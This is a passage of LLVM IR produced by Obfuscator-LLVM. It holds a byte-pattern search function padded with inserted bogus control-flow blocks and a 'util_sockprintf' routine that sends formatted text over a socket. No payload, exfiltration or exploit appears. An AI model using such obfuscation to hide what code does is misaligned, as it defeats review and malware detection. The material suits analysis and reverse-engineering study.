  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:48:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  br label %49

; <label>:49:                                     ; preds = %78, %48
  %50 = load i32, i32* %18, align 4
  %51 = load i32, i32* %15, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %81

; <label>:53:                                     ; preds = %49
  %54 = load i8*, i8** %14, align 8
  %55 = load i32, i32* %18, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = load i8*, i8** %16, align 8
  %61 = load i32, i32* %19, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %59, %65
  br i1 %66, label %67, label %76

; <label>:67:                                     ; preds = %53
  %68 = load i32, i32* %19, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %19, align 4
  %70 = load i32, i32* %17, align 4
  %71 = icmp eq i32 %69, %70
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %18, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %13, align 4
  br label %82

; <label>:75:                                     ; preds = %67
  br label %77

; <label>:76:                                     ; preds = %53
  store i32 0, i32* %19, align 4
  br label %77

; <label>:77:                                     ; preds = %76, %75
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %18, align 4
  br label %49

; <label>:81:                                     ; preds = %49
  store i32 -1, i32* %13, align 4
  br label %82

; <label>:82:                                     ; preds = %81, %72, %originalBBpart24
  %83 = load i32, i32* %13, align 4
  ret i32 %83

originalBBalteredBB:                              ; preds = %originalBB, %4
  %84 = alloca i32, align 4
  %85 = alloca i8*, align 8
  %86 = alloca i32, align 4
  %87 = alloca i8*, align 8
  %88 = alloca i32, align 4
  %89 = alloca i32, align 4
  %90 = alloca i32, align 4
  store i8* %0, i8** %85, align 8
  store i32 %1, i32* %86, align 4
  store i8* %2, i8** %87, align 8
  store i32 %3, i32* %88, align 4
  store i32 0, i32* %90, align 4
  %91 = load i32, i32* %88, align 4
  %92 = load i32, i32* %86, align 4
  %93 = icmp sgt i32 %91, %92
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 -1, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [4098 x i8], align 16
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %14 = call i32 @vsnprintf(i8* %11, i64 4096, i8* %12, %struct.__va_list_tag* %13) #5
  store i32 %14, i32* %8, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %34

; <label>:19:                                     ; preds = %2
  %20 = load i32, i32* %8, align 4
  %21 = icmp sgt i32 %20, 4096
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  store i32 4096, i32* %8, align 4
  br label %23

; <label>:23:                                     ; preds = %22, %19
  %24 = load i32, i32* %4, align 4
  %25 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %26 = load i32, i32* %8, align 4
  %27 = sext i32 %26 to i64
  %28 = call i64 @send(i32 %24, i8* %25, i64 %27, i32 16384)
  %29 = load i32, i32* %8, align 4
  %30 = sext i32 %29 to i64
  %31 = icmp ne i64 %28, %30
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %23
  store i8 0, i8* %3, align 1
  br label %35

; <label>:33:                                     ; preds = %23
  br label %34

; <label>:34:                                     ; preds = %33, %2
  store i8 1, i8* %3, align 1
  br label %35

; <label>:35:                                     ; preds = %34, %32
  %36 = load i8, i8* %3, align 1
  ret i8 %36
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: nounwind
declare i32 @vsnprintf(i8*, i64, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
